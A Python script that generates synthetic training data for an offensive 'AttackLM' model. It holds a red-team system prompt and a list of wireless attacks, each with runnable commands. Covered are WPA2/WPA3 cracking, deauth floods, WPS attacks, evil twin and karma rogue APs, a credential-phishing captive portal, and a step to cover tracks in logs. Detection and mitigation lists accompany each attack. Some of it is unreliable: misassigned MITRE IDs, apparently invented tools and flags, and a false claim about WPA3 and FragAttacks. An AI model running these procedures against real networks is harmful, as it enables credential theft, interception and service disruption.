#!/usr/bin/env python3
"""acquire_wireless_dataset.py — Generate synthetic wireless attack training pairs
for AttackLM bucket format.

Covers: WPA2/WPA3 attacks, deauthentication, rogue AP, evil twin, Bluetooth attacks,
wireless LAN attacks, and RF-based attacks.

Output: data/datasets/buckets/wireless/attacks/data_synth.jsonl
        data/datasets/buckets/wireless/attacks/metadata.json

Usage:
    python scripts/acquire_wireless_dataset.py
    python scripts/acquire_wireless_dataset.py --count 10
"""

from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
BUCKET_DIR = BASE_DIR / "data" / "datasets" / "buckets" / "wireless" / "attacks"
DATA_FILE = BUCKET_DIR / "data_synth.jsonl"
META_FILE = BUCKET_DIR / "metadata.json"

SEED = 42
SOURCE_NAME = "wireless_synthetic"
LICENSE = "MIT"
SYSTEM_PROMPT = (
    "You are an authorized Red Team WIRELESS specialist. "
    "You provide precise adversary emulation techniques for security validation."
)

ENVIRONMENT_TYPES = [
    "corporate wireless network",
    "public WiFi hotspot",
    "industrial IoT environment",
    "healthcare facility wireless",
    "educational campus WiFi",
    "government secure facility",
    "retail POS wireless",
    "smart home IoT environment",
    "transportation system wireless",
    "data center wireless management",
]

SEVERITY_LEVELS = ["critical", "high", "medium", "low"]

TESTING_FRAMEWORKS = [
    "MITRE ATT&CK",
    "OWASP IoT Security",
    "NIST SP 800-115",
    "PTES",
    "OSSTMM",
    "Wireless Security Assessment Guide (PCI)",
]

ATTACKS: list[dict] = [
    # === WPA2/WPA3 ===
    {
        "category": "wpa",
        "name": "WPA2-PSK Handshake Capture and Offline Cracking",
        "mitre_ids": ["T1602.001"],
        "desc": "Capturing WPA2 4-way handshake and performing offline dictionary attack to recover the PSK.",
        "steps": "1. Set monitor mode: `airmon-ng start wlan0`\n2. Discover networks: `airodump-ng wlan0mon`\n3. Target specific AP: `airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon`\n4. Deauth client to force handshake: `aireplay-ng --deauth 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon`\n5. Capture 4-way handshake (shown in airodump-ng as 'WPA handshake')\n6. Crack with dictionary: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`\n7. Or PMKID attack (no client needed): `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=3 --filterlist_ap=<AP_MAC>`\n8. Convert and crack: `hcxpcapngtool pmkid.pcapng -o hash.hc22000 && hashcat -m 22000 hash.hc22000 rockyou.txt`",
        "detection": [
            "Deauthentication frames (type 0, subtype 12)",
            "Excessive deauth frames from single source",
            "Monitor mode interface detection on AP",
            "Multiple authentication failures followed by success",
        ],
        "mitigations": [
            "WPA3 (SAE) where available",
            "Strong PSKs (16+ characters, passphrase randomness)",
            "802.11w (Management Frame Protection)",
            "Wireless IDS monitoring deauth frames",
            "MAC filtering (defense in depth, not sole defense)",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Enterprise Credential Theft",
        "mitre_ids": ["T1602.001"],
        "desc": "Attacking WPA2-Enterprise (802.1X) networks via rogue AP and credential harvesting.",
        "steps": "1. Identify EAP type: `airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon` (look for EAP frames)\n2. Set up rogue AP with hostapd-wpe: `hostapd-wpe hostapd-wpe.conf`\n3. Configure hostapd-wpe.conf for EAP: `eap_server=1, eap_user_file=/etc/hostapd-wpe/eap_user.conf`\n4. Capture MS-CHAPv2 credentials or EAP-MSCHAPv2 hashes\n5. Crack with asleap: `asleap -C <challenge> -R <response> -W wordlist.txt`\n6. Or relay with Responder: credentials are automatically cracked\n7. Alternative: use EAP-TLS downgrade attack if PEAP is configured",
        "detection": [
            "Rogue AP with same ESSID as legitimate network",
            "EAP downgrade attacks",
            "MS-CHAPv2 authentication from unexpected AP",
            "Certificate validation failures on clients",
        ],
        "mitigations": [
            "EAP-TLS (certificate-based) authentication",
            "Server certificate validation on clients",
            "802.1X with dynamic VLAN assignment",
            "Wireless IDS detecting rogue APs",
            "WPA3-Enterprise (SAE-Enterprise)",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA3 Dragonblood Attack (SAE Downgrade)",
        "mitre_ids": ["T1602.001"],
        "desc": "Downgrade WPA3 to WPA2 to perform traditional handshake attacks.",
        "steps": "1. Identify WPA3 network: `airodump-ng wlan0mon` (look for MFP=required)\n2. Set up rogue AP with same ESSID but WPA2: `hostapd-mana hostapd.conf` with `wpa=2, wpa_key_mgmt=WPA-PSK`\n3. Configure transition mode: `wpa=2, wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256`\n4. Clients with transition mode enabled will connect to WPA2 rogue AP\n5. Capture WPA2 handshake: standard 4-way handshake capture\n6. Crack: `aircrack-ng -w rockyou.txt capture.cap`\n7. Or: perform timing attack on SAE confirm phase for offline brute force",
        "detection": [
            "AP advertising WPA2 when WPA3 is expected",
            "Multiple APs with same ESSID and different security modes",
            "Management Frame Protection downgrade",
            "SAE authentication failures on legitimate AP",
        ],
        "mitigations": [
            "Disable WPA3 transition mode (WPA2/WPA3 mixed)",
            "Enforce WPA3-only mode on APs",
            "Client-side WPA3-only enforcement",
            "Monitor for downgrade attacks",
            "802.11w Management Frame Protection",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Key Reinstallation Attack (KRACK)",
        "mitre_ids": ["T1602.001"],
        "desc": "Exploiting the 4-way handshake key reinstallation vulnerability to decrypt traffic.",
        "steps": "1. Set up attack: `airmon-ng start wlan0 && airodump-ng wlan0mon`\n2. Identify target network and client\n3. Use krack-scripts or custom script to manipulate handshake:\n   - Block message 4 of 4-way handshake from AP to client\n   - Force client to reinstall the same key\n   - Replay message 3 to trigger key reinstallation\n4. Capture encrypted traffic: `airodump-ng --bssid <AP_MAC> -c <channel> -w krack_capture wlan0mon`\n5. After key reinstallation: nonce reuse allows decryption\n6. Decrypt captured traffic: `airdecap-ng -w <PSK> krack_capture-01.cap` (or use Python krack scripts)\n7. Alternatively: inject packets using reused nonce",
        "detection": [
            "Duplicate handshake message 3 (retransmission)",
            "Key reinstallation patterns in packet capture",
            "Nonce reuse in encrypted traffic",
            "Client reconnect storms",
        ],
        "mitigations": [
            "Patch all clients and APs (key installation only on first use)",
            "Disable client-side TKIP",
            "Use WPA3 where available",
            "Network monitoring for KRACK patterns",
            "Firmware updates on all wireless devices",
        ],
    },
    {
        "category": "wpa",
        "name": "PMKID Attack (WPA2 Without Client)",
        "mitre_ids": ["T1602.001"],
        "desc": "Attacking WPA2 networks by extracting the PMKID without needing a connected client.",
        "steps": "1. Set monitor mode: `airmon-ng start wlan0`\n2. Start hcxdumptool: `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1`\n3. Target specific AP: `hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=ap_list.txt --filtermode=2`\n4. Convert capture: `hcxpcapngtool pmkid.pcapng -o hash.hc22000`\n5. Crack with hashcat: `hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt`\n6. Advantage: no need for connected client (unlike traditional 4-way handshake)",
        "detection": [
            "PMKID extraction attempts (association requests from unknown MACs)",
            "Beacon request frames from unknown devices",
            "PMKID-related frames in wireless captures",
            "Multiple association attempts from unknown devices",
        ],
        "mitigations": [
            "Disable PMKID on AP (if supported)",
            "WPA3 (no PMKID vulnerability)",
            "Strong PSKs (16+ characters)",
            "802.11w Management Frame Protection",
            "Wireless IDS monitoring PMKID requests",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Enterprise EAP-TLS Downgrade Attack",
        "mitre_ids": ["T1602.001"],
        "desc": "Downgrading EAP-TLS authentication to weaker EAP methods on WPA2-Enterprise networks to capture credentials.",
        "steps": "1. Identify target EAP method: `airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon` (look for EAP-TLS in beacon frames)\n2. Set up rogue AP with hostapd-wpe: configure to advertise EAP-TLS but negotiate PEAP/MS-CHAPv2\n3. Configure hostapd-wpe.conf: `eap_server=1, eap_method=peap, phase1='peapver=0'`\n4. Client attempts EAP-TLS, rogue AP responds with PEAP negotiation\n5. Client may accept downgrade if certificate validation is misconfigured\n6. Capture MS-CHAPv2 challenge/response from downgraded session\n7. Crack credentials: `asleap -C <challenge> -R <response> -W wordlist.txt`",
        "detection": [
            "EAP negotiation downgrade from TLS to PEAP",
            "Server certificate mismatch or self-signed certificate",
            "EAP-TLS connection attempts followed by PEAP success",
            "MS-CHAPv2 authentication from unexpected AP MAC",
        ],
        "mitigations": [
            "Enforce EAP-TLS with strict certificate validation on clients",
            "Configure GPO/MDM to reject EAP method downgrades",
            "Deploy WPA3-Enterprise with SAE",
            "Monitor for EAP negotiation anomalies in RADIUS logs",
            "Implement Protected Management Frames on enterprise APs",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Dictionary Attack with Custom Wordlists",
        "mitre_ids": ["T1602.001"],
        "desc": "Performing targeted WPA2 PSK cracking using custom-generated wordlists based on organizational intelligence.",
        "steps": "1. Capture WPA2 handshake or PMKID: standard airodump-ng + aireplay-ng or hcxdumptool\n2. Convert to hash format: `hcxpcapngtool capture.pcapng -o hash.hc22000`\n3. Generate targeted wordlist with mentalist: `mentalist --min 8 --max 16 -o custom_wordlist.txt` (company name + patterns)\n4. Or use CeWL to crawl organization website: `cewl -d 5 -m 8 -w org_wordlist.txt https://target.org`\n5. Or use crunch with known patterns: `crunch 8 16 -t @@@@Company -o pattern_wordlist.txt`\n6. Apply rules with hashcat: `hashcat -m 22000 hash.hc22000 custom_wordlist.txt -r /usr/share/hashcat/rules/best64.rule`\n7. Combine wordlists: `cat org_wordlist.txt pattern_wordlist.txt | sort -u > combined.txt`\n8. Final crack: `hashcat -m 22000 hash.hc22000 combined.txt`",
        "detection": [
            "Multiple failed PSK authentication attempts",
            "Dictionary attack patterns in RADIUS logs",
            "Large number of handshake captures from same source",
            "Repeated association/disassociation cycles",
        ],
        "mitigations": [
            "Use strong, random PSKs of 16+ characters",
            "Transition to WPA3-SAE or WPA3-Enterprise",
            "Implement 802.11w Management Frame Protection",
            "Deploy wireless IDS to detect brute-force attempts",
            "Regular wireless security assessments per NIST SP 800-115",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Fragmentation Attack (Vanhoef)",
        "mitre_ids": ["T1602.001"],
        "desc": "Exploiting WPA2 fragmentation and aggregation vulnerabilities to decrypt traffic and inject frames (FragAttacks).",
        "steps": "1. Identify target WPA2 network: `airodump-ng wlan0mon`\n2. Test for fragmentation vulnerability: `python3 fragattacks.py --iface wlan0mon --target <AP_MAC>`\n3. Exploit mixed key fragmentation: inject encrypted frame with fragmented packet\n4. Or exploit A-MSDU aggregation: inject frame accepted as aggregated packet\n5. Inject and decrypt: use fragmented frame to map plaintext to network\n6. Cache attack: ping through AP using injected fragment to obtain keystream\n7. Test all 12 FragAttack variants: mixed key, fragment cache, A-MSDU injection\n8. Full attack suite: `python3 fragattacks.py --iface wlan0mon --all-tests <AP_MAC>`",
        "detection": [
            "Fragmented frames with incorrect FCS or sequence numbers",
            "A-MSDU frames with unexpected content",
            "ICV mismatches in fragmented traffic",
            "Abnormal fragment cache behavior on AP",
        ],
        "mitigations": [
            "Apply vendor firmware patches for CVE-2020-24588 through CVE-2020-26145",
            "Disable A-MSDU aggregation if not required",
            "Deploy WPA3 which is not vulnerable to these attacks",
            "Monitor for fragmented frame anomalies per OWASP IoT Security guidelines",
            "Network segmentation to limit blast radius",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA3 Side-Channel Attack",
        "mitre_ids": ["T1602.001"],
        "desc": "Exploiting side-channel vulnerabilities in WPA3 SAE (Simultaneous Authentication of Equals) implementation.",
        "steps": "1. Identify WPA3 network using SAE: `airodump-ng wlan0mon` (look for MFP=required, SAE)\n2. Set up timing measurement infrastructure: `python3 dragonblood.py --timing-attack --iface wlan0mon`\n3. Perform timing-based side-channel: measure SAE commit computation time\n4. Collect multiple timing samples: `for i in $(seq 1 1000); do python3 sae_timing.py --target <AP_MAC>; done`\n5. Analyze timing variance: offline password candidate evaluation\n6. Reduce search space: timing differences leak information about password characters\n7. Brute-force reduced space: `hashcat -m 22000 reduced_space_hash.txt reduced_passwords.txt`",
        "detection": [
            "Excessive SAE authentication attempts from single source",
            "Timing anomaly patterns in SAE commit exchanges",
            "Multiple failed SAE commits followed by successful authentication",
            "Abnormal AP CPU utilization during SAE computation",
        ],
        "mitigations": [
            "Implement constant-time SAE implementations",
            "Deploy WPA3-Enterprise with certificate-based auth",
            "Rate-limit SAE authentication attempts on AP",
            "Monitor for timing-based attack patterns per MITRE ATT&CK",
            "Firmware updates addressing Dragonblood CVEs",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Group Key Recovery",
        "mitre_ids": ["T1602.001"],
        "desc": "Recovering the WPA2 group temporal key (GTK) to decrypt broadcast and multicast traffic.",
        "steps": "1. Capture WPA2 handshake including group key handshake: `airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon`\n2. Recover PSK using standard methods (dictionary attack on 4-way handshake)\n3. Derive PTK from PSK: `airdecap-ng -w <PSK> -e <SSID> capture.cap`\n4. Extract GTK from handshake message 3 (key data field)\n5. Alternatively: use gtk-rekey tool: `python3 gtk_rekey.py --psk <PSK> --ssid <SSID> --capture capture.cap`\n6. Decrypt broadcast traffic: `airdecap-ng -w <PSK> -e <SSID> --gtk <GTK_HEX> capture.cap`\n7. Monitor group key rekeying for GTK rotation tracking",
        "detection": [
            "Multiple group key handshake captures",
            "GTK reuse across rekeying intervals",
            "Broadcast/multicast decryption attempts",
            "Abnormal group key rekeying frequency",
        ],
        "mitigations": [
            "Enable frequent GTK rekeying on APs",
            "Use WPA3 with individualized data encryption",
            "Implement VLAN segmentation for broadcast traffic",
            "Monitor for GTK extraction patterns per NIST SP 800-115",
            "Deploy wireless IDS with group key anomaly detection",
        ],
    },
    {
        "category": "wpa",
        "name": "WPA2 Client Isolation Bypass",
        "mitre_ids": ["T1602.001"],
        "desc": "Bypassing AP client isolation to perform lateral movement between wireless clients.",
        "steps": "1. Connect to target wireless network with valid credentials\n2. Test client isolation: `ping <CLIENT_IP>` (should fail if isolation enabled)\n3. ARP scan for clients: `arp-scan --interface=wlan0 <SUBNET>`\n4. Bypass via ARP poisoning: `arpspoof -i wlan0 -t <CLIENT_IP> <GATEWAY_IP>`\n5. Or bypass via direct frame injection: `aireplay-ng -h <AP_MAC> -D wlan0mon`\n6. Test with ICMP: `ping -c 3 <ISOLATED_CLIENT_IP>` (may succeed via ARP cache poisoning)\n7. Intercept inter-client traffic: `ettercap -T -q -i wlan0 -M arp:remote /<GATEWAY>// /<CLIENT>//`",
        "detection": [
            "ARP spoofing attempts on wireless segment",
            "Inter-client traffic despite AP isolation enabled",
            "ARP cache anomalies on wireless clients",
            "Unauthorized DHCP responses on wireless network",
        ],
        "mitigations": [
            "Enable AP client isolation and verify enforcement",
            "Deploy Private VLAN Edge (PVLAN) on supporting switches",
            "Monitor for ARP spoofing on wireless segments per PTES methodology",
            "Use WPA3 with individualized encryption",
            "Implement wireless IDS with lateral movement detection",
        ],
    },
    # === DEAUTHENTICATION ===
    {
        "category": "deauth",
        "name": "Targeted Deauthentication Attack",
        "mitre_ids": ["T1590.002"],
        "desc": "Disconnecting specific clients from a wireless network using deauthentication frames.",
        "steps": "1. Set monitor mode: `airmon-ng start wlan0`\n2. Discover targets: `airodump-ng wlan0mon` → note AP MAC and channel\n3. Identify client: `airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon` → note client MAC\n4. Send targeted deauth: `aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon`\n5. Broadcast deauth (all clients): `aireplay-ng --deauth 0 -a <AP_MAC> wlan0mon` (continuous)\n6. Verify disconnect: client loses connection and attempts reconnection\n7. Capture handshake during reconnection",
        "detection": [
            "Deauthentication frames (802.11 type 0, subtype 12)",
            "Excessive deauth frames from single source",
            "Deauth frames with broadcast destination",
            "Client reconnection storms",
        ],
        "mitigations": [
            "802.11w Management Frame Protection (MFP)",
            "Wireless IDS monitoring deauth frames",
            "Client-side MFP support",
            "WPA3 with MFP required",
            "Deauth frame rate limiting on APs",
        ],
    },
    {
        "category": "deauth",
        "name": "Deauthentication Flood (Mass Disconnect)",
        "mitre_ids": ["T1590.002"],
        "desc": "Flooding the wireless network with deauthentication frames to disconnect all clients.",
        "steps": "1. Set monitor mode: `airmon-ng start wlan0`\n2. Discover all APs: `airodump-ng wlan0mon`\n3. Flood deauth to all clients: `aireplay-ng --deauth 0 -a <AP_MAC> wlan0mon`\n4. Or target multiple APs: `for mac in <AP1> <AP2> <AP3>; do aireplay-ng --deauth 0 -a $mac wlan0mon & done`\n5. Verify: all clients lose connectivity\n6. Duration: continuous until attack stopped or MFP blocks frames",
        "detection": [
            "Mass deauthentication event across network",
            "Deauth frames with reason code 7 (Class 3 frame from non-associated)",
            "Wireless IDS alert: deauth flood detected",
            "Complete wireless service disruption",
        ],
        "mitigations": [
            "802.11w Management Frame Protection (MFP)",
            "WPA3 (mandates MFP)",
            "Wireless IDS with deauth detection",
            "AP-side deauth frame filtering",
            "Backup wired connectivity for critical systems",
        ],
    },
    {
        "category": "deauth",
        "name": "Channel Switch Announcement Attack",
        "mitre_ids": ["T1590.002"],
        "desc": "Forcing clients to switch to a different channel using forged CSA frames, enabling easier interception.",
        "steps": "1. Identify target AP channel: `airodump-ng wlan0mon`\n2. Set up rogue AP on different channel (e.g., channel 1 when target is on channel 6)\n3. Send forged Channel Switch Announcement: `python3 csa_attack.py --target_bssid <AP_MAC> --new_channel 1 --interface wlan0mon`\n4. Clients switch to attacker's channel based on CSA frame\n5. Clients connect to rogue AP on new channel\n6. Capture traffic or perform MITM on new channel",
        "detection": [
            "Channel Switch Announcement frames from unauthorized sources",
            "Clients switching channels unexpectedly",
            "Multiple CSA frames in short period",
            "AP channel mismatch with known good configuration",
        ],
        "mitigations": [
            "802.11w Management Frame Protection",
            "Client-side channel verification",
            "WPA3 (mandates MFP)",
            "Wireless IDS detecting CSA frame anomalies",
            "AP channel stickiness configuration",
        ],
    },
    {
        "category": "deauth",
        "name": "Deauthentication for Targeted Client Isolation",
        "mitre_ids": ["T1590.002"],
        "desc": "Using targeted deauthentication to isolate a specific client from the wireless network for credential harvesting or man-in-the-middle positioning.",
        "steps": "1. Identify target client on network: `airodump-ng --bssid <AP_MAC> -c <channel> wlan0mon`\n2. Note client MAC address and signal strength\n3. Set up evil twin AP on same channel with stronger signal\n4. Send continuous targeted deauth: `aireplay-ng --deauth 0 -a <AP_MAC> -c <TARGET_MAC> wlan0mon`\n5. Client reconnects to evil twin (stronger signal proximity)\n6. Harvest credentials or perform MITM on isolated client\n7. Monitor reconnection: `airodump-ng --bssid <EVIL_MAC> -c <channel> wlan0mon`",
        "detection": [
            "Persistent deauth frames targeting single client MAC",
            "Client connecting to AP with different BSSID than expected",
            "Signal strength anomalies near target client",
            "DHCP lease changes for target client",
        ],
        "mitigations": [
            "802.11w Management Frame Protection",
            "WPA3-SAE preventing forced reconnection",
            "Client certificate-based authentication (802.1X)",
            "Wireless IDS with targeted deauth detection per MITRE ATT&CK T1590",
            "BSSID whitelisting on client devices",
        ],
    },
    {
        "category": "deauth",
        "name": "Deauthentication for Forced WPS Interaction",
        "mitre_ids": ["T1590.002"],
        "desc": "Using deauthentication to force clients into WPS PIN configuration mode, enabling WPS-based attacks.",
        "steps": "1. Identify target AP with WPS enabled: `wash -i wlan0mon`\n2. Verify WPS status: `reaver -i wlan0mon -b <AP_MAC> --probe`\n3. Deauth clients to force AP into WPS configuration mode: `aireplay-ng --deauth 20 -a <AP_MAC> wlan0mon`\n4. After client disconnect, AP may enter WPS push-button or PIN mode\n5. Initiate WPS PIN attack: `reaver -i wlan0mon -b <AP_MAC> -vv`\n6. Or use Pixie Dust: `reaver -i wlan0mon -b <AP_MAC> -K 1`\n7. Recover PSK from successful WPS exchange",
        "detection": [
            "Deauth frames immediately before WPS negotiation attempts",
            "WPS PIN attempts from unrecognized devices",
            "Excessive WPS authentication failures",
            "WPS lock-out events on AP",
        ],
        "mitigations": [
            "Disable WPS on all access points",
            "802.11w Management Frame Protection",
            "WPA3 (eliminates WPS dependency)",
            "Monitor for WPS brute-force attempts per PTES methodology",
            "AP-side WPS rate limiting and lockout",
        ],
    },
    {
        "category": "deauth",
        "name": "Deauthentication as Smokescreen for Lateral Movement",
        "mitre_ids": ["T1590.002"],
        "desc": "Using mass deauthentication as a diversion while performing lateral movement across the wireless network.",
        "steps": "1. Plan lateral movement path through target network\n2. Set up monitoring on adjacent wireless segments: `airodump-ng wlan0mon`\n3. Launch deauth flood on primary target AP: `mdk3 wlan0mon d -b target_ap_list.txt -c <channel>`\n4. While IDS focuses on deauth event, pivot to secondary network\n5. Connect to adjacent AP: `wpa_supplicant -i wlan1 -c wpa_config.conf`\n6. Perform lateral movement on wired/wireless segment\n7. Clean up: cease deauth, remove monitoring\n8. Cover tracks in logs if accessible",
        "detection": [
            "Coordinated deauth events across multiple APs",
            "New wireless connections during deauth storms",
            "Anomalous lateral traffic patterns during wireless disruption",
            " IDS alert correlation between wireless and wired events",
        ],
        "mitigations": [
            "802.11w Management Frame Protection on all APs",
            "Correlated wireless and wired IDS monitoring per OSSTMM",
            "Network segmentation between wireless and wired infrastructure",
            "Anomaly detection for lateral movement during wireless events",
            "WPA3 mandatory across all enterprise APs",
        ],
    },
    {
        "category": "deauth",
        "name": "Deauth Flood with Channel Hopping",
        "mitre_ids": ["T1590.002"],
        "desc": "Performing deauthentication attacks while hopping across WiFi channels to disrupt multi-channel deployments.",
        "steps": "1. Identify all target APs and channels: `airodump-ng wlan0mon`\n2. Create channel hop script: `for ch in 1 6 11; do iwconfig wlan0mon channel $ch && aireplay-ng --deauth 5 -a <AP_MAC_$ch> wlan0mon; done`\n3. Use mdk3 for automated channel hopping: `mdk3 wlan0mon d -b ap_list.txt -c all`\n4. Or use custom tool with rapid channel switching:\n```python\nimport subprocess, time\nchannels = {1: 'AP_MAC_1', 6: 'AP_MAC_6', 11: 'AP_MAC_11'}\nfor ch, mac in channels.items():\n    subprocess.run(['iwconfig', 'wlan0mon', 'channel', str(ch)])\n    subprocess.run(['aireplay-ng', '--deauth', '10', '-a', mac, 'wlan0mon'])\n    time.sleep(0.5)\n```\n5. Verify disruption across all channels",
        "detection": [
            "Deauth frames on multiple channels in rapid succession",
            "Rapid channel switching by monitoring device",
            "Coordinated deauth events across 2.4GHz and 5GHz bands",
            "Channel hop patterns in wireless IDS logs",
        ],
        "mitigations": [
            "802.11w Management Frame Protection on all channels",
            "Dual-band WPA3 deployment",
            "Wireless IDS with cross-channel correlation per NIST SP 800-115",
            "AP-side deauth filtering with rate limiting",
            "Centralized wireless controller monitoring all channels",
        ],
    },
    {
        "category": "deauth",
        "name": "Management Frame Protection Bypass",
        "mitre_ids": ["T1590.002"],
        "desc": "Bypassing 802.11w Management Frame Protection to send forged management frames on protected networks.",
        "steps": "1. Verify MFP status on target: `airodump-ng wlan0mon` (look for MFP=required)\n2. Identify MFP implementation flaws:\n   - Some clients accept unprotected management frames even when MFP is required\n   - Test with unprotected deauth: `aireplay-ng --deauth 5 -a <AP_MAC> wlan0mon`\n3. Exploit MFP transition mode: some APs accept both protected and unprotected frames\n4. Forge disassociation frame: `python3 mfp_bypass.py --type disassoc --bssid <AP_MAC> --client <CLIENT_MAC>`\n5. Exploit group-addressed management frame vulnerability (some APs don't protect group frames)\n6. Test action frame injection: some implementations don't protect action frames\n7. Use EAPOL frame injection: `aireplay-ng --deauth 0 -a <AP_MAC> wlan0mon` with modified reason code",
        "detection": [
            "Unprotected management frames on MFP-required networks",
            "Mixed protected/unprotected management frame traffic",
            "Disassociation frames with invalid MFP ICV",
            "Action frames bypassing MFP verification",
        ],
        "mitigations": [
            "Enforce WPA3 with MFP required (not optional)",
            "Patch AP firmware for MFP bypass vulnerabilities",
            "Deploy wireless IDS with MFP verification per OWASP IoT Security",
            "Client-side MFP enforcement via GPO/MDM",
            "Monitor for unprotected management frames on MFP networks",
        ],
    },
    # === ROGUE AP / EVIL TWIN ===
    {
        "category": "rogue_ap",
        "name": "Rogue Access Point (Karma Attack)",
        "mitre_ids": ["T1602.001"],
        "desc": "Creating a rogue access point that responds to all probe requests to capture clients.",
        "steps": "1. Set up rogue AP with hostapd-mana: `hostapd-mana hostapd.conf`\n2. Configure hostapd-mana for karma attacks:\n```\ninterface=wlan0\ndriver=nl80211\nssid=FreeWiFi\nchannel=6\nkarma_attack=1\n```\n3. Start DHCP server: `dnsmasq -C dnsmasq.conf`\n4. Configure dnsmasq.conf:\n```\ndhcp-range=10.0.0.100,10.0.0.200,12h\ndhcp-option=3,10.0.0.1\n```\n5. Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`\n6. Start DNS spoofing: `dnsspoof -i wlan0`\n7. Capture credentials: all clients probing for any SSID will connect",
        "detection": [
            "AP responding to all probe requests",
            "Multiple SSIDs advertised by single AP",
            "DHCP server on unexpected channel",
            "Clients connecting to AP with wrong BSSID",
        ],
        "mitigations": [
            "802.11w Management Frame Protection",
            "Certificate-based EAP authentication",
            "WPA3-SAE (immune to karma attacks)",
            "Client-side BSSID verification",
            "Wireless IDS detecting rogue APs",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Evil Twin Attack with Credential Harvesting",
        "mitre_ids": ["T1602.001"],
        "desc": "Creating a malicious AP that mimics a legitimate network to harvest credentials.",
        "steps": "1. Identify target SSID: `airodump-ng wlan0mon`\n2. Set up evil twin: `hostapd-wpe hostapd.conf` with same SSID as target\n3. Configure hostapd.conf:\n```\ninterface=wlan0\ndriver=nl80211\nssid=<TargetSSID>\nchannel=6\nwpa=2\nwpa_key_mgmt=WPA-EAP\nieee8021x=1\neap_server=1\neap_user_file=/etc/hostapd-wpe/eap_user.conf\n```\n4. Start captive portal: `python3 captive_portal.py --interface wlan0 --ssid <TargetSSID>`\n5. Deauth clients from legitimate AP: `aireplay-ng --deauth 50 -a <LEGIT_AP_MAC> wlan0mon`\n6. Clients connect to evil twin (stronger signal)\n7. Capture credentials through captive portal or EAP exchange",
        "detection": [
            "Two APs with same SSID on different BSSIDs",
            "AP with stronger signal appearing suddenly",
            "DHCP server on same channel as legitimate AP",
            "Captive portal redirecting to credential harvesting page",
        ],
        "mitigations": [
            "WPA3-Enterprise with certificate validation",
            "Client-side certificate pinning",
            "Wireless IDS for evil twin detection",
            "Enterprise authentication (802.1X)",
            "Monitor for SSID/BSSID mismatches",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Captive Portal Phishing via Evil Twin",
        "mitre_ids": ["T1566.001"],
        "desc": "Using an evil twin AP with captive portal to phish user credentials.",
        "steps": '1. Set up evil twin AP (see evil twin attack)\n2. Configure DNS to redirect all requests: `dnsmasq --address=/#/10.0.0.1`\n3. Create phishing captive portal:\n```html\n<!DOCTYPE html>\n<html><head><title>WiFi Login</title></head>\n<body>\n<h1>Please authenticate to continue</h1>\n<form action="/login" method="POST">\n  <input name="username" placeholder="Email/Username"><br>\n  <input name="password" type="password" placeholder="Password"><br>\n  <button type="submit">Connect</button>\n</form></body></html>\n```\n4. Start web server: `python3 -m http.server 80 --directory portal/`\n5. Deauth clients to force reconnection to evil twin\n6. Capture submitted credentials',
        "detection": [
            "Captive portal appearing on known-good networks",
            "SSL certificate mismatch on captive portal",
            "DNS resolution redirecting all domains to single IP",
            "Login page requesting credentials outside normal authentication flow",
        ],
        "mitigations": [
            "Enterprise 802.1X authentication",
            "WPA3-SAE preventing evil twin",
            "Client certificate authentication",
            "Wireless IDS detecting portal pages",
            "User training on credential submission",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Wi-Fi Direct (P2P) Exploitation",
        "mitre_ids": ["T1590.002"],
        "desc": "Exploiting Wi-Fi Direct (P2P) connections to gain access to devices.",
        "steps": "1. Discover Wi-Fi Direct devices: `wpa_cli p2p_find`\n2. List P2P devices: `wpa_cli p2p_peers`\n3. Connect to P2P device: `wpa_cli p2p_connect <MAC> pbc`\n4. Or: use Wi-Fi Direct for PIN-based pairing: `wpa_cli p2p_connect <MAC> <PIN> display`\n5. Access P2P services: file sharing, screen mirroring, printer\n6. Exploit vulnerable P2P services: Miracast injection, WPS PIN brute force",
        "detection": [
            "Wi-Fi Direct connection attempts from unknown devices",
            "P2P group formation from unexpected sources",
            "WPS PIN attempts on P2P interfaces",
            "P2P service discovery from non-authorized devices",
        ],
        "mitigations": [
            "Disable Wi-Fi Direct when not in use",
            "P2P device authentication",
            "Monitor for unauthorized P2P connections",
            "Update device firmware for Wi-Fi Direct vulnerabilities",
            "Restrict P2P group formation",
        ],
    },
    {
        "category": "rogue_ap",
        "name": "Enterprise Evil Twin with RADIUS Proxy",
        "mitre_ids": ["T1602.001"],
        "desc": "Deploying a rogue AP that proxies RADIUS authentication to capture enterprise credentials while passing through legitimate auth.",
